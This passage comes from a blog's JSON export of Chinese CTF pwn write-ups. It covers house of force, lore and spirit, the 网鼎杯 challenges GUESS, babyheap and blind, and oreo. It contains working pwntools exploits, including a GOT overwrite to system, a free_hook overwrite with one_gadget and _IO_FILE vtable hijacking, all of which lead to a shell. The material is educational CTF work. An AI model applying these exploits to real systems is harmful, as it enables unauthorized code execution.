puts(&quot;Input the id:&quot;); i = get_num(); if ( i &lt; 0 || i &gt; 9 ) return puts(&quot;Invalid ID.&quot;); ptr_ = (void *)ptr[i]; if ( !ptr_ ) return puts(&quot;Note has been deleted.&quot;); ptr[i] = 0; len_[i] = 0; free(ptr_); return puts(&quot;Delete success.&quot;);&#125; 思路主程序看了一遍又一遍，还是没发现任何漏洞。回头看，问题出现在前面： name是用read读取的，结尾没有’\\x00’;而输出是以读取到’\\x00’为止的，那么就可以泄露堆地址。(ps: 大概是在strcpy到指定大小的地址时，如果写入大小与目标地址大小相同，则在后面会添加目标地址的指针。具体原因目前未明) org &amp; host 这边的strcpy操作会自动在结尾加’\\n’,结果就是在一通复制完之后，可以修改topchunk的size使之变为0xffffffff，满足houseofforce条件 之后进入程序。 计算大小将topchunk调整到bss段的len[]及ptr[]附近，欺骗程序chunk的分配。之后的思路在exp中写的很清楚 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485from pwn import *context.log_level =&apos;debug&apos;sh = process(&apos;./bcloud&apos;)elf = ELF(&apos;./bcloud&apos;)libc = ELF(&apos;libc-2.19.so&apos;)#-----------get heap_base------------sh.recvuntil(&apos;Input your name:\\n&apos;)sh.send(&apos;a&apos;*64)#gdb.attach(sh)sh.recvuntil(&apos;a&apos;*64)heap_base = u32(sh.recv()[:4])-8print &apos;heap_base: &apos;+hex(heap_base)#---------house of force----------------!!!!!!!!!!sh.send(&apos;b&apos;*0x40)#sh.recvuntil(&apos;Host:&apos;)sh.sendline(p32(0xffffffff))#b(0x8048978)#gdb.attach(sh)#,&apos;b&apos; *0x804895e)#------------calc malloc size----------------!!!!!!!!!!!!topchunk_addr = heap_base + 0xd8print &apos;topchunk_addr: &apos;+hex(topchunk_addr)len_addr = 0x0804b0a0list_addr = 0x0804b120target_addr = len_addr - 8size = target_addr - topchunk_addr-4-7print str(size)#----------edit topchunk to size[i]--------------sh.recvuntil(&apos;option---&gt;&gt;\\n&apos;)sh.sendline(&apos;1&apos;)#sh.recv()sh.sendline(str(size-4))sh.recv()sh.send(&apos;\\n&apos;)#gdb.attach(sh)#--------------edit ptr to got_addr---------------payload = p32(16) *3 + (list_addr-len_addr-12)*&apos;a&apos;payload += p32(elf.got[&apos;free&apos;]) +p32( elf.got[&apos;atoi&apos;])*2#+elf.got[&apos;atoi&apos;] sh.sendline(&apos;1&apos;)#sh.recv()sh.sendline(&apos;1000&apos;)sh.recv()sh.sendline(payload)#gdb.attach(sh)#sh.recv()sh.sendline(&apos;3&apos;)sh.sendline(&apos;0&apos;)sh.recv()sh.sendline(p32(elf.plt[&apos;puts&apos;]))#---------leak atoi_addr to get system_addr-----------------sh.sendline(&apos;4&apos;)sh.recv()sh.sendline(&apos;1&apos;)#gdb.attach(sh)atoi_plt = sh.recv()[:4]#sh.recv()system_addr = u32(atoi_plt) - libc.symbols[&apos;atoi&apos;] + libc.symbols[&apos;system&apos;]print &apos;system_addr: &apos;+hex(system_addr)#gdb.attach(sh)#-------------edit atoi to system------------------sh.sendline(&apos;3&apos;)sh.sendline(&apos;2&apos;)sh.recv()sh.sendline(p32(system_addr))#gdb.attach(sh)#--------------------- get shell------------------sh.sendlineafter(&apos;option---&gt;&gt;&apos;, &apos;/bin/sh\\x00&apos;)#sh.send(&apos;/bin/sh\\x00&apos;)sh.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"Introduction to pwn2.6-HouseOfLore","slug":"introduction-to-pwn2-6-houseoflore","date":"2019-01-22T09:33:51.000Z","updated":"2019-01-22T09:43:37.326Z","comments":true,"path":"2019/01/22/introduction-to-pwn2-6-houseoflore/","link":"","permalink":"http://siriuswhiter.tk/2019/01/22/introduction-to-pwn2-6-houseoflore/","excerpt":"","text":"House of Lore 原理看了下原理，没有太多的东西，和house of spirit的思想是一样的，只是spirit是在fastbin大小的chunk范围内伪造fake chunk，而House of Lore是small bin 与 large bin大小的chunk ， 不过后来因为large bin添加了保护措施，便无法再利用。 house of lore 相比会麻烦一点，毕竟smallbin的检查比较多，因而大部分准备都是为了能够绕过检测。 单拿例子说一下吧，有对应的练习之后再加： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950struct small_chunk &#123; size_t prev_size; size_t size; struct small_chunk *fd; struct small_chunk *bk; char buf[0x64]; // chunk falls in smallbin size range&#125;;struct small_chunk fake_chunk; // At address 0x7ffdeb37d050struct small_chunk another_fake_chunk;struct small_chunk *real_chunk;unsigned long long *ptr, *victim;int len;len = sizeof(struct small_chunk);// Grab two small chunk and free the first one// This chunk will go into unsorted binptr = malloc(len); // points to address 0x1a44010// The second malloc can be of random size. We just want that// the first chunk does not merge with the top chunk on freeingmalloc(len); // points to address 0x1a440a0// This chunk will end up in unsorted binfree(ptr);real_chunk = (struct small_chunk *)(ptr - 2); // points to address 0x1a44000// Grab another chunk with greater size so as to prevent getting back// the same one. Also, the previous chunk will now go from unsorted to// small binmalloc(len + 0x10); // points to address 0x1a44130// Make the real small chunk&apos;s bk pointer point to &amp;fake_chunk// This will insert the fake chunk in the smallbinreal_chunk-&gt;bk = &amp;fake_chunk;// and fake_chunk&apos;s fd point to the small chunk// This will ensure that &apos;victim-&gt;bk-&gt;fd == victim&apos; for the real chunkfake_chunk.fd = real_chunk;// We also need this &apos;victim-&gt;bk-&gt;fd == victim&apos; test to pass for fake chunkfake_chunk.bk = &amp;another_fake_chunk;another_fake_chunk.fd = &amp;fake_chunk;// Remove the real chunk by a standard call to mallocmalloc(len); // points at address 0x1a44010// Next malloc for that size will return the fake chunkvictim = malloc(len); // points at address 0x7ffdeb37d060 注释已经说得很清楚了，就不再赘述了","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"网鼎杯pwn复现","slug":"网鼎杯pwn复现","date":"2018-12-28T11:20:12.000Z","updated":"2018-12-30T06:18:30.806Z","comments":true,"path":"2018/12/28/网鼎杯pwn复现/","link":"","permalink":"http://siriuswhiter.tk/2018/12/28/网鼎杯pwn复现/","excerpt":"","text":"第一次打比赛便被网鼎杯血虐，当时栈溢出的水平不足以达到唯一的一个栈溢出的题目的要求，堆就更不必多说了。现在在学习堆的中间回来看看有没有能力去复现当时的题。 GUESS题目还是比较清晰的，将flag.txt的内容读到了栈上，我们就是想方设法将其输出出来； 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; __WAIT_STATUS stat_loc; // [rsp+14h] [rbp-8Ch] int v5; // [rsp+1Ch] [rbp-84h] __int64 i; // [rsp+20h] [rbp-80h] __int64 max_num_3; // [rsp+28h] [rbp-78h] char flag_is_here; // [rsp+30h] [rbp-70h] char s2; // [rsp+60h] [rbp-40h] unsigned __int64 canary; // [rsp+98h] [rbp-8h] canary = __readfsqword(0x28u); max_num_3 = 3LL; LODWORD(stat_loc.__uptr) = 0; i = 0LL; setvbuf_and_alarm(); HIDWORD(stat_loc.__iptr) = open(&quot;./flag.txt&quot;, 0, a2); if ( HIDWORD(stat_loc.__iptr) == -1 ) &#123; perror(&quot;./flag.txt&quot;); _exit(-1); &#125; read(SHIDWORD(stat_loc.__iptr), &amp;flag_is_here, 0x30uLL); close(SHIDWORD(stat_loc.__iptr)); // read flag.txt // // // // puts(&quot;This is GUESS FLAG CHALLENGE!&quot;); while ( 1 ) &#123; if ( i &gt;= max_num_3 ) &#123; puts(&quot;you have no sense... bye :-) &quot;); return 0LL; &#125; v5 = get_fork(); if ( !v5 ) break; ++i; wait((__WAIT_STATUS)&amp;stat_loc); &#125; puts(&quot;Please type your guessing flag&quot;); gets(&amp;s2); if ( !strcmp(&amp;flag_is_here, &amp;s2) ) puts(&quot;You must have great six sense!!!! :-o &quot;); else puts(&quot;You should take more effort to get six sence, and one more challenge!!&quot;); return 0LL;&#125; 分析程序有canary，溢出点也很清晰；这里就涉及到了canary的ssp leak；因为只有三次机会，我们需要的就是栈地址；所以第一次得到libc地址，第二次可以用environ变量得到栈地址，第三次读flag即可。 当时卡住的地方是栈地址的泄露： 栈的地址可以通过libc中的一个变量 _environ变量泄露出来。因为在libc中的全局变量 environ储存着该程序环境变量的地址，而环境变量是储存在栈上的，所以可以泄露栈地址，进而计算出flag在栈上的地址。 exp1234567891011121314151617181920212223242526272829303132333435363738from pwn import *context.log_level = &apos;debug&apos;sh = process(&apos;./GUESS&apos;)libc = ELF(&apos;./libc.so.6&apos;)puts_got = 0x602020sh.recvuntil(&quot;guessing flag\\n&quot;)sh.sendline(p64(puts_got)*0x100)sh.recvuntil(&quot;*** stack smashing detected ***: &quot;)gdb.attach(sh)puts_addr = u64(sh.recvn(6).ljust(8,&apos;\\x00&apos;))libc.address = puts_addr- libc.symbols[&apos;puts&apos;]environ = libc.symbols[&apos;environ&apos;]sh.recvuntil(&quot;guessing flag\\n&quot;)sh.sendline(p64(environ)*0x100)sh.recvuntil(&quot;*** stack smashing detected ***: &quot;)#gdb.attach(sh)stack_addr = u64(sh.recvn(6).ljust(8,&apos;\\x00&apos;))sh.recvuntil(&quot;guessing flag\\n&quot;)sh.sendline(p64(stack_addr -0x168)*0x100)sh.interactive()结果如下：You should take more effort to get six sence, and one more challenge!!*** stack smashing detected ***: flag&#123;Th1s_1S_Fl3g&#125;me terminated babyheap题目题目写的还是比较清晰的，功能如下 123456789int menu()&#123; puts(&quot;1.alloc&quot;); puts(&quot;2.edit&quot;); puts(&quot;3.show&quot;); puts(&quot;4.free&quot;); puts(&quot;5.exit&quot;); return printf(&quot;Choice:&quot;);&#125; alloc 会分配固定0x30大小的chunk，最多alloc 9次；edit 可以选择修改chunk，最多edit 3次 ， 与alloc均不存在溢出的可能；show 会将内容打印出来；free 将chunk free掉，有明显的UAF漏洞。 1234567$ checksec babyheap[*] &apos;/home/sirius/tikool/wangdingbei/babyheap/babyheap&apos; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 分析保护基本上全开，为了拿到shell，我们选择修改malloc_hook或free_hook来执行system(‘/bin/sh’)或使用one_gadget拿shell； 为了能够修改free_hook,我们需要leak libc的基址，但是程序只会固定malloc(0x20),也就是0x30大小的chunk，该chunk属于fastbin，而众所周知，fastbin是没办法泄露libc基址的，因此我们需要smallbin； 为了能够搞到smallbin，我们决定利用free的漏洞，当连续free两个chunk时，后free的fastbin的fd指针会指向先free的chunk，然后我们show便可以泄露堆地址； 当泄露出堆地址之后，我们可以修改fd指针的指向地址，这样malloc时便会到我们想要的地址，所以我们有机会来让修改chunk能够使其去伪造smallbin大小的chunk，这样想方设法将其free之后，其fd指针与bk指针指向&lt;main_arena+88&gt;处，这样show便可以泄露libc地址。 不过最终要控制malloc 与 edit的次数，在有限的次数内完成功能， 不得已的话再想办法修改edit的次数限制。 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146from pwn import *context.log_level = &apos;debug&apos;p = process(&apos;./babyheap&apos;)elf = ELF(&apos;./babyheap&apos;)libc = ELF(&apos;./libc.so.6&apos;)def Add(index, data): p.recvuntil(&apos;Choice:&apos;) p.sendline(&apos;1&apos;) p.recvuntil(&apos;Index:&apos;) p.sendline(str(index)) p.recvuntil(&apos;Content:&apos;) p.send(data)def Edit(index, data): p.recvuntil(&apos;Choice:&apos;) p.sendline(&apos;2&apos;) p.recvuntil(&apos;Index:&apos;) p.sendline(str(index)) p.recvuntil(&apos;Content:&apos;) p.send(data)def Show(index): p.recvuntil(&apos;Choice:&apos;) p.sendline(&apos;3&apos;) p.recvuntil(&apos;Index:&apos;) p.sendline(str(index))def Delete(index): p.recvuntil(&apos;Choice:&apos;) p.sendline(&apos;4&apos;) p.recvuntil(&apos;Index:&apos;) p.sendline(str(index))Add(0,&apos;aaaaaaaa\\n&apos;)Add(1,&apos;bbbbbbbb\\n&apos;)Add(2,&apos;cccccccc\\n&apos;)Add(3,&apos;dddddddd\\n&apos;)#--------------leak heap addr----------------Add(4, p64(0xa0) + p64(0x31) + p64(0x602080 - 0x18) + p64(0x602080 - 0x10))Add(5, p64(0x30) + p64(0x30) + &apos;\\n&apos;)Delete(1)Delete(0)Show(0)heap_addr = u64(p.recvline()[ : -1].ljust(8, &apos;\\x00&apos;)) - 0x30print &quot;heap_addr: &quot; + hex(heap_addr)``pwndbg&gt; x/10gx 0x0000000000602060 &lt;---chunk_ptr 0-50x602060: 0x00000000011e2010 0x00000000011e20400x602070: 0x00000000011e2070 0x00000000011e20a00x602080: 0x00000000011e20d0 0x00000000011e21000x602090: 0x0000000000000000 0x00000000000000000x6020a0: 0x0000000000000000 0x0000000000000000pwndbg&gt; x/40gx 0x000000000011e20000x11e2000: 0x0000000000000000 0x00000000000000310x11e2010: 0x00000000011e2030 &lt;--- get heap addr 0x00000000000000000x11e2020: 0x0000000000000000 0x00000000000000000x11e2030: 0x0000000000000000 0x00000000000000310x11e2040: 0x0000000000000000 0x00000000000000000x11e2050: 0x0000000000000000 0x00000000000000000x11e2060: 0x0000000000000000 0x00000000000000310x11e2070: 0x6363636363636363 0x00000000000000000x11e2080: 0x0000000000000000 0x00000000000000000x11e2090: 0x0000000000000000 0x00000000000000310x11e20a0: 0x6464646464646464 0x00000000000000000x11e20b0: 0x0000000000000000 0x00000000000000000x11e20c0: 0x0000000000000000 0x00000000000000310x11e20d0: 0x00000000000000a0 0x00000000000000310x11e20e0: 0x0000000000602068 0x00000000006020700x11e20f0: 0x0000000000000000 0x00000000000000310x11e2100: 0x0000000000000030 0x00000000000000300x11e2110: 0x0000000000000000 0x00000000000000000x11e2120: 0x0000000000000000 0x0000000000020ee10x11e2130: 0x0000000000000000 0x0000000000000000``#-------------leak libc addr--------------------Edit(0, p64(heap_addr + 0x20) + p64(0) + p64(0) + p64(0x31))gdb.attach(p)Add(6, p64(0) + p64(0xa1) + &apos;\\n&apos;)Add(7, p64(0) + p64(0xa1) + &apos;\\n&apos;)gdb.attach(p)Delete(1)Show(1)libc_address = u64(p.recvline()[ : -1].ljust(8, &apos;\\x00&apos;))-0x3c4b78print &quot;libc_addr: &quot; + hex(libc_address)gdb.attach(p)``pwndbg&gt; x/10gx 0x0000000000602060 &lt;---- chunk_ptr 0-70x602060: 0x00000000011e2010 0x00000000011e20400x602070: 0x00000000011e2070 0x00000000011e20a00x602080: 0x0000000000602068 0x00000000011e21000x602090: 0x00000000011e2010 0x00000000011e2030 &lt;---被带偏的chunk0x6020a0: 0x0000000000000000 0x0000000000000000pwndbg&gt; x/40gx 0x000000000011e20000x11e2000: 0x0000000000000000 0x00000000000000310x11e2010: 0x0000000000000000 0x00000000000000a10x11e2020: 0x0000000000000000 0x00000000000000310x11e2030: 0x0000000000000000 0x00000000000000d1 &lt;-----fake small chunk0x11e2040: 0x00007f042e615b78 0x00007f042e615b78 &lt;-----get libc addr 0x11e2050: 0x0000000000000000 0x00000000000000000x11e2060: 0x0000000000000000 0x00000000000000310x11e2070: 0x6363636363636363 0x00000000000000000x11e2080: 0x0000000000000000 0x00000000000000000x11e2090: 0x0000000000000000 0x00000000000000310x11e20a0: 0x6464646464646464 0x00000000000000000x11e20b0: 0x0000000000000000 0x00000000000000000x11e20c0: 0x0000000000000000 0x00000000000000310x11e20d0: 0x00000000000000a0 0x00000000000000310x11e20e0: 0x0000000000602068 0x00000000006020700x11e20f0: 0x0000000000000000 0x00000000000000310x11e2100: 0x00000000000000d0 0x00000000000000300x11e2110: 0x0000000000000000 0x00000000000000000x11e2120: 0x0000000000000000 0x0000000000020ee10x11e2130: 0x0000000000000000 0x0000000000000000``#---------cover free_hook with one_gadget to get shell --------------------------one_gadget = 0x45216free_hook = libc_address + 0x3c67a8print &quot;free_hook: &quot;+ hex(free_hook)Edit(4,p64(free_hook) + &apos;\\n&apos;)Edit(1, p64(libc_address + one_gadget)[:-1] + &apos;\\n&apos;)Delete(1)p.interactive() blind题目题目风格与babyheap基本一致：malloc的chunk大小变为0x68 最后得到的chunk也就是0x70,最多6个chunk；edit函数功能一致，去掉了次数限制，show函数被去掉；free函数仍然存在UAF，且限制3次。同时添加了一个system(‘/bin/sh’)的函数。 分析直接给了system(‘/bin/sh’)的函数，所以目标就是控制程序执行该函数；看了半天没有头绪，能知道利用UAF漏洞将chunk分配到想要的地方，但是因为没有show函数，并没有办法泄露栈地址；去看了下大佬们的思路，发现是将chunk malloc到bss段，而bss段存在着_IO_FILE的结构体及vtable虚表指针，我们通过修改指针指向，之后伪造file结构体及伪造虚表指针，程序在退出时会自动调用从而拿到shell。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556pwndbg&gt; x/6gx 0x602020 &lt;---------bss段的file指针0x602020 &lt;stdout&gt;: 0x00007ffff7dd2620 0x0000000000000000 0x602030 &lt;stdin&gt;: 0x00007ffff7dd18e0 0x00000000000000000x602040 &lt;stderr&gt;: 0x00007ffff7dd2540 0x0000000000000000pwndbg&gt; x/28gx 0x00007ffff7dd2620 &lt;----------stdout的结构体0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;: 0x00000000fbad2887 0x00007ffff7dd26a30x7ffff7dd2630 &lt;_IO_2_1_stdout_+16&gt;: 0x00007ffff7dd26a3 0x00007ffff7dd26a30x7ffff7dd2640 &lt;_IO_2_1_stdout_+32&gt;: 0x00007ffff7dd26a3 0x00007ffff7dd26a30x7ffff7dd2650 &lt;_IO_2_1_stdout_+48&gt;: 0x00007ffff7dd26a3 0x00007ffff7dd26a30x7ffff7dd2660 &lt;_IO_2_1_stdout_+64&gt;: 0x00007ffff7dd26a4 0x00000000000000000x7ffff7dd2670 &lt;_IO_2_1_stdout_+80&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd2680 &lt;_IO_2_1_stdout_+96&gt;: 0x0000000000000000 0x00007ffff7dd18e00x7ffff7dd2690 &lt;_IO_2_1_stdout_+112&gt;: 0x0000000000000001 0xffffffffffffffff0x7ffff7dd26a0 &lt;_IO_2_1_stdout_+128&gt;: 0x000000000a000000 0x00007ffff7dd37800x7ffff7dd26b0 &lt;_IO_2_1_stdout_+144&gt;: 0xffffffffffffffff 0x00000000000000000x7ffff7dd26c0 &lt;_IO_2_1_stdout_+160&gt;: 0x00007ffff7dd17a0 0x00000000000000000x7ffff7dd26d0 &lt;_IO_2_1_stdout_+176&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd26e0 &lt;_IO_2_1_stdout_+192&gt;: 0x00000000ffffffff 0x00000000000000000x7ffff7dd26f0 &lt;_IO_2_1_stdout_+208&gt;: 0x0000000000000000 0x00007ffff7dd06e0pwndbg&gt; p *(struct _IO_FILE_plus *) stdout &lt;--------结构体含义$4 = &#123; file = &#123; _flags = -72537977, _IO_read_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\\n&quot;, _IO_read_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\\n&quot;, _IO_read_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\\n&quot;, _IO_write_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\\n&quot;, _IO_write_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\\n&quot;, _IO_write_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\\n&quot;, _IO_buf_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\\n&quot;, _IO_buf_end = 0x7ffff7dd26a4 &lt;_IO_2_1_stdout_+132&gt; &quot;&quot;, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;, _fileno = 1, _flags2 = 0, _old_offset = -1, _cur_column = 0, _vtable_offset = 0 &apos;\\000&apos;, _shortbuf = &quot;\\n&quot;, _lock = 0x7ffff7dd3780 &lt;_IO_stdfile_1_lock&gt;, _offset = -1, _codecvt = 0x0, _wide_data = 0x7ffff7dd17a0 &lt;_IO_wide_data_1&gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = -1, _unused2 = &apos;\\000&apos; &lt;repeats 19 times&gt; &#125;, vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt; &lt;---------将要被修改指向system(&apos;/bin/sh&apos;)函数的虚表指针&#125; 这个确实是知识点不足，对_IO_FILE比较陌生。 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697from pwn import *context.log_level=&apos;debug&apos;sh = process(&apos;./blind&apos;)elf = ELF(&apos;./libc.so.6&apos;)def new(idx,content): sh.sendline(&apos;1&apos;) sh.recvuntil(&apos;Index:&apos;) sh.sendline(str(idx)) sh.recvuntil(&apos;Content:&apos;) sh.send(content) sh.recvuntil(&apos;Choice:&apos;)def change(idx,content): sh.sendline(&apos;2&apos;) sh.recvuntil(&apos;Index:&apos;) sh.sendline(str(idx)) sh.recvuntil(&apos;Content:&apos;) sh.send(content) sh.recv()def delete(idx): sh.sendline(&apos;3&apos;) sh.recvuntil(&apos;Index:&apos;) sh.sendline(str(idx)) sh.recvuntil(&apos;Choice:&apos;)system_addr = 0x4008E3new(0,&apos;a\\n&apos;)new(1,&apos;b\\n&apos;)delete(0)change(0,p64(0x60203d)+&apos;\\n&apos;) &lt;-------直接利用UAF漏洞伪造fastbin，相对于释放两个再伪造方便了不少gdb.attach(sh)payload = &apos;a&apos;*0x13 + p64(0x602020)+p64(0x602090)+ p64(0x602090+0x68)+ p64(0x602090+0x68*2) + p64(0x602090+0x68*3)+&apos;\\n&apos;new(2,&apos;a\\n&apos;)new(3,payload) &lt;-------------伪造的chunk 再用来修改存储chunk指针的地方，后面malloc的事直接省了，还不用考虑过malloc(fastbin)的检查gdb.attach(sh)fake_struct = p64(0x00000000fbad8000) + p64(0x602060)*7 + p64(0x602061) + p64(0)*4 fake_struct += p64(0x602060) + p64(0x1) + p64(0xffffffffffffffff) + p64(0)fake_struct += p64(0x602060) + p64(0xffffffffffffffff) + p64(0) + p64(0x602060) fake_struct += p64(0)*3 + p64(0x00000000ffffffff) + p64(0)*2 + p64(0x602090 + 0x68*3)fake_vtable = p64(system_addr)*10change(1,fake_struct[:0x68])change(2,fake_struct[0x68:0xd0])change(3,fake_struct[0xd0:]+&apos;\\n&apos;)change(4,fake_vtable+&apos;\\n&apos;)gdb.attach(sh)x/100gx 0x6020200x602020 &lt;stdout&gt;: 0x00007f8bb5dde620 0x0000000000000000 0x602030 &lt;stdin&gt;: 0x00007f8bb5ddd8e0 0x00000000000000000x602040 &lt;stderr&gt;: 0x00007f8bb5dde540 0x61616100000000000x602050: 0x6161616161616161 0x61616161616161610x602060: 0x0000000000602020 0x00000000006020900x602070: 0x00000000006020f8 0x0000000000602160 &lt;-----伪造的一堆chunk指针0x602080: 0x00000000006021c8 0x00000000000000000x602090: 0x00000000fbad8000 0x0000000000602060 &lt;-----fake_struct 开始0x6020a0: 0x0000000000602060 0x00000000006020600x6020b0: 0x0000000000602060 0x00000000006020600x6020c0: 0x0000000000602060 0x00000000006020600x6020d0: 0x0000000000602061 0x00000000000000000x6020e0: 0x0000000000000000 0x00000000000000000x6020f0: 0x0000000000000000 0x00000000006020600x602100: 0x0000000000000001 0xffffffffffffffff0x602110: 0x0000000000000000 0x00000000006020600x602120: 0xffffffffffffffff 0x00000000000000000x602130: 0x0000000000602060 0x00000000000000000x602140: 0x0000000000000000 0x00000000000000000x602150: 0x00000000ffffffff 0x00000000000000000x602160: 0x0000000000000000 0x00000000006021c8 &lt;----vtable指针指向存放system(&apos;/bin/sh&apos;)函数的地址0x602170: 0x0000000000000000 0x00000000000000000x602180: 0x0000000000000000 0x00000000000000000x602190: 0x0000000000000000 0x00000000000000000x6021a0: 0x0000000000000000 0x00000000000000000x6021b0: 0x0000000000000000 0x00000000000000000x6021c0: 0x0000000000000000 0x00000000004008e3 &lt;-----存放了一堆system(&apos;/bin/sh&apos;)函数的地址，便于命中0x6021d0: 0x00000000004008e3 0x00000000004008e30x6021e0: 0x00000000004008e3 0x00000000004008e30x6021f0: 0x00000000004008e3 0x00000000004008e30x602200: 0x00000000004008e3 0x00000000004008e30x602210: 0x00000000004008e3 0x0000000000000000change(0,p64(0x602090)+&apos;\\n&apos;) &lt;------修改stdout指针，稳了sh.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"}]},{"title":"Introduction to pwn2.5-HouseOfSpirit","slug":"introduction-to-pwn2-5-houseofspirit","date":"2018-12-23T12:50:03.000Z","updated":"2018-12-29T04:14:14.569Z","comments":true,"path":"2018/12/23/introduction-to-pwn2-5-houseofspirit/","link":"","permalink":"http://siriuswhiter.tk/2018/12/23/introduction-to-pwn2-5-houseofspirit/","excerpt":"","text":"House of Spirit 原理终于正式步入了houseof系列！！ house of spirit 其实也属于fastbin attack。简单来讲就是伪造一个chunk，不论这个chunk在什么位置，使之能够满足被free的条件，之后再将其malloc出来，因为malloc到了一个我们可控的区域，就有希望继续为所欲为。 依旧heap-explotation举例 1234567891011121314151617181920212223242526272829struct fast_chunk &#123; size_t prev_size; size_t size; struct fast_chunk *fd; struct fast_chunk *bk; char buf[0x20]; // chunk falls in fastbin size range&#125;;struct fast_chunk fake_chunks[2]; // Two chunks in consecutive memory// fake_chunks[0] at 0x7ffe220c5ca0// fake_chunks[1] at 0x7ffe220c5ce0void *ptr, *victim;ptr = malloc(0x30); // First malloc// Passes size check of &quot;free(): invalid size&quot;fake_chunks[0].size = sizeof(struct fast_chunk); // 0x40// Passes &quot;free(): invalid next size (fast)&quot;fake_chunks[1].size = sizeof(struct fast_chunk); // 0x40// Attacker overwrites a pointer that is about to be &apos;freed&apos;ptr = (void *)&amp;fake_chunks[0].fd;// fake_chunks[0] gets inserted into fastbinfree(ptr);victim = malloc(0x30); // 0x7ffe220c5cb0 address returned from malloc 可以看见最后malloc到了fakechunk的位置，之后具体的利用以oreo举例 oreo条件1.malloc123456789101112131415161718192021222324252627282930313233unsigned int add()&#123; rifle *v1; // [esp+18h] [ebp-10h] unsigned int v2; // [esp+1Ch] [ebp-Ch] v2 = __readgsdword(0x14u); v1 = head; head = (rifle *)malloc(0x38u); if ( head ) &#123; head-&gt;next = v1; printf(&quot;Rifle name: &quot;); fgets(head-&gt;name, 0x38, stdin); cut_enter(head-&gt;name); printf(&quot;Rifle description: &quot;); fgets(head-&gt;descript, 0x38, stdin); cut_enter(head-&gt;descript); ++rifle_cnt; &#125; else &#123; puts(&quot;Something terrible happened!&quot;); &#125; return __readgsdword(0x14u) ^ v2;&#125;分析得到的结构体, name及description存在明显的溢出。00000000 rifle struc ; (sizeof=0x38, mappedto_5)00000000 descript db 25 dup(?)00000019 name db 27 dup(?)00000034 next dd ? ; offset00000038 rifle ends 2.show 通过i-&gt;next遍历所有的malloc结果 123456789101112131415unsigned int show_rifles()&#123; rifle *i; // [esp+14h] [ebp-14h] unsigned int v2; // [esp+1Ch] [ebp-Ch] v2 = __readgsdword(0x14u); printf(&quot;Rifle to be ordered:\\n%s\\n&quot;, &quot;===================================&quot;); for ( i = head; i; i = i-&gt;next ) &#123; printf(&quot;Name: %s\\n&quot;, i-&gt;name); printf(&quot;Description: %s\\n&quot;, i); puts(&quot;===================================&quot;); &#125; return __readgsdword(0x14u) ^ v2;&#125; 3.message 给了一块0x80大小的可以写notice的内存，给了我们伪造bypass fakechunk检查的机会 12345678910unsigned int message()&#123; unsigned int v0; // ST1C_4 v0 = __readgsdword(0x14u); printf(&quot;Enter any notice you&apos;d like to submit with your order: &quot;); fgets(notice, 0x80, stdin); cut_enter(notice); return __readgsdword(0x14u) ^ v0;&#125; 思路在上面的条件之下，我们便有了机会利用house of spirit 的机会，注意到bss段变量的存放顺序–&gt; 12345678910.bss:0804A288 head .bss:0804A288 .bss:0804A28C .bss:0804A2A0 order_num .bss:0804A2A0 .bss:0804A2A4 rifle_cnt .bss:0804A2A4 .bss:0804A2A8 ; char *notice.bss:0804A2A8 notice .bss:0804A2A8 而程序中仅有固定的malloc(0x38)，分配出来的chunk size应该为0x41,我们可以想到，当malloc足够的chunk时，rifle_cnt将可以达到0x40，为了绕过free fastbin的检查我们就需要在notice中伪造nextchunk的pre_size 及size，这个很容易以做到。伪造完成后，因为add中存在对name的溢出，那么如果将其溢出至rifle-&gt;next的位置，填入任一函数的got地址，那么在show时便足以泄露实际地址然后得到system，/bin/sh的地址。之后便将其溢出为fakechunk处，为之后的free做好准备。 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586from pwn import *context.terminal = [&apos;gnome-terminal&apos;, &apos;-x&apos;, &apos;sh&apos;, &apos;-c&apos;]if args[&apos;DEBUG&apos;]: context.log_level = 